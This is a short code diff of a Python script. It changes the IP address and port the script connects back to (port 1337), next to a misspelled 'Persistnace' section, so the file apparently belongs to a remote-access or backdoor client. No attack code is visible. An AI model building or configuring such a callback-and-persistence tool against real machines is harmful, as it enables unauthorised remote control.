@@ -18,8 +18,8 @@ import requests
 
 # Hosting
 
-hostServer = '192.168.1.12' # change this to host ip or dns. ( local ipv4 for example)
-hostPort = 2035  # change this to da port on ur pc to connect on. Make sure its the same one as on your server!
+hostServer = '192.1.1.1' # change this to host ip or dns. ( local ipv4 for example)
+hostPort = 1337  # change this to da port on ur pc to connect on. Make sure its the same one as on your server!
 
 
 # Persistnace
@@ -213,4 +213,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
